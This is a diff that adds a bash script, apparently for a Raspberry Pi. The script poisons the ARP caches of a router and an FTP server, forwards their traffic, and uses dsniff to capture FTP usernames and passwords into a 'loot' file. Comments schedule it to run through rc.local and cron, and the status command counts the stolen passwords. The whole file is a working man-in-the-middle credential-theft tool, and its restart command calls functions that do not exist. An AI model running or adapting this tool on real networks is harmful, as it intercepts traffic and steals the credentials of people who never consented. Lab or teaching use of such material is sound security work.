@@ -1,0 +1,209 @@
+#!/usr/bin/env bash
+
+# Usage:       sudo /home/pi/bin/mitm ( start | restart | status | stop )
+#                or
+#              sudo bash /home/pi/bin/mitm ( start | restart | status | stop )
+# Description: This script configures this RPi as router.
+#              It brings this RPi by poisoning the ARP cache of two machines on
+#                the local network between their network communications.
+#              It tries to spy out user and password combinations (ftp).
+# Author:      Tim Adamek (tim.adamek@polizei.niedersachsen.de)
+# Couthor:     Patrick Neumann (patrick.neumann@polizei.niedersachsen.de)
+# Platform:    Raspbian GNU/Linux 9.x and 10.x
+# Version:     1.01
+# Date:        2020-03-18 (first release: 2019-05-09)
+# License:     GPL3
+# Warranty:    This program is distributed WITHOUT ANY WARRANTY
+
+#=== /etc/rc.local  ============================================================
+# add (without leading hashtag!):
+#sleep 10
+#/home/pi/bin/mitm start
+
+#=== CRONTAB (root) ============================================================
+# sudo crontab -e
+
+# add (without leading hashtag!):
+#SHELL="/bin/sh"
+#PATH="/sbin:/bin:/usr/sbin:/usr/bin"
+#55 23 * * * /home/pi/bin/mitm stop > /dev/null
+#5 0 * * * /home/pi/bin/mitm start
+
+#=== CONFIGURATION =============================================================
+readonly NIC="eth0"
+readonly ROUTER="192.168.178.1"
+readonly SERVER="192.168.178.10"
+readonly DIR="/home/pi"
+readonly PROTO="21/tcp=ftp"
+readonly FILE="${DIR}/dsniff.txt"
+readonly BACKUP="off"
+readonly BACKUP_DIR="${DIR}/dsniff"
+readonly BACKUP_FILE="${BACKUP_DIR}/$( date "+%Y%m%d%H%M%S" ).txt"
+
+#-------------------------------------------------------------------------------
+# This script hat to be executed as root!
+#-------------------------------------------------------------------------------
+if [ "$( id --user )" -ne 0 ] ; then
+  printf "you need to be root - EXIT!\\n"
+  exit 1
+fi
+
+#-------------------------------------------------------------------------------
+# This script supports only one command at the same time!
+#-------------------------------------------------------------------------------
+if [ "${#}" -ne 1 ]; then
+  printf "supported commands: start, restart, status OR stop - EXIT!\\n"
+  exit 2
+fi
+
+#-------------------------------------------------------------------------------
+# dsniff (incl. arpspoof) has to be installed before execution!
+#-------------------------------------------------------------------------------
+if ! [ -x /usr/sbin/dsniff ] ; then
+  printf "please install dsniff first - EXIT!\\n"
+  exit 3
+fi
+
+#=== FUNCTION ==================================================================
+# NAME:        activate_ipf
+# DESCRIPTION: Configures this RPi as router.
+# PARAMETERS:  none            
+#===============================================================================
+activate_ipf () {
+  if [ "$( cat /proc/sys/net/ipv4/ip_forward )" -eq 0 ] ; then
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+  fi
+}
+
+#=== FUNCTION ==================================================================
+# NAME:        start_asp
+# DESCRIPTION: Start ARP poisioning of two machines in the local network.
+# PARAMETERS:  none
+#===============================================================================
+start_asp () {
+  if ! pgrep arpspoof > /dev/null 2>&1 ; then
+    arpspoof -i "${NIC}" -t "${ROUTER}" -r "${SERVER}" > /dev/null 2>&1 &
+  fi
+}
+
+#=== FUNCTION ==================================================================
+# NAME:        backup_ds
+# DESCRIPTION: Backup loot.
+# PARAMETERS:  none
+#===============================================================================
+backup_ds () {
+  if ! [ -d "${BACKUP_DIR}" ] ; then
+    mkdir "${BACKUP_DIR}"
+  fi
+
+  if [ -s "${FILE}" ] ; then
+    mv "${FILE}" "${BACKUP_FILE}"
+  fi
+}
+
+#=== FUNCTION ==================================================================
+# NAME:        start_ds
+# DESCRIPTION: Start spying for credentials (overwriting old loot).
+# PARAMETERS:  none
+#===============================================================================
+start_ds () {
+  if ! pgrep dsniff > /dev/null 2>&1 ; then
+    dsniff -i "${NIC}" -n -t "${PROTO}" > "${FILE}" 2> /dev/null &
+  fi
+}
+
+#=== FUNCTION ==================================================================
+# NAME:        stop_ds
+# DESCRIPTION: Stop spying for credentials.
+# PARAMETERS:  none
+#===============================================================================
+stop_ds () {
+  if pgrep dsniff > /dev/null 2>&1 ; then
+    pkill -INT dsniff
+  fi
+}
+#=== FUNCTION ==================================================================
+# NAME:        stop_asp
+# DESCRIPTION: Stop ARP poisioning and cleaning ARP caches (ca. 10 secs).
+# PARAMETERS:  none
+#===============================================================================
+stop_asp () {
+  if pgrep arpspoof > /dev/null 2>&1 ; then
+    pkill -INT arpspoof
+    for count in {0..9} ; do
+      printf "."
+      sleep 1
+    done
+    printf "\\n"
+  fi
+}
+
+#=== FUNCTION ==================================================================
+# NAME:        deactivate_ipf
+# DESCRIPTION: Deconfigures this RPi as router.
+# PARAMETERS:  none            
+#===============================================================================
+deactivate_ipf () {
+  if [ "$( cat /proc/sys/net/ipv4/ip_forward )" -eq 1 ] ; then
+    echo 0 > /proc/sys/net/ipv4/ip_forward
+  fi
+}
+
+#-------------------------------------------------------------------------------
+# This is the "real magic" of this script...
+#-------------------------------------------------------------------------------
+case "${1}" in
+
+  start )
+    activate_ipf
+    start_asp
+    if [ "${BACKUP}" = "on" ] ; then
+      backup_ds
+    fi
+    start_ds
+    ;;
+
+  status )
+    if [ "$( cat /proc/sys/net/ipv4/ip_forward )" -eq 1 ] ; then
+      printf "ip forwarding is active.\\n"
+    else
+      printf "ip forwarding is NOT active.\\n"
+    fi
+
+    if pgrep arpspoof > /dev/null 2>&1 ; then
+      printf "arp poisioning is running.\\n"
+    else
+      printf "arp poisioning is NOT running.\\n"
+    fi
+
+    if pgrep dsniff > /dev/null 2>&1 ; then
+      PASSWORDS="$( grep -c -E "^PASS[[:space:]]" "${FILE}" )"
+      printf "password sniffing is running.\\n"
+      printf "%d password(s) found.\\n" "${PASSWORDS}"
+    else
+      printf "password sniffing is NOT running.\\n"
+    fi
+    ;;
+
+  stop )
+    stop_ds
+    stop_asp
+    deactivate_ipf
+    ;;
+
+  restart )
+    stop_dsniff
+    stop_arpspoof
+    sleep 5
+    start_arpspoof
+    start_dsniff
+    ;;
+
+  * )
+    printf "supported commands: start, restart, status OR stop - EXIT!\\n"
+    exit 2
+    ;;
+
+esac
+
+exit 0
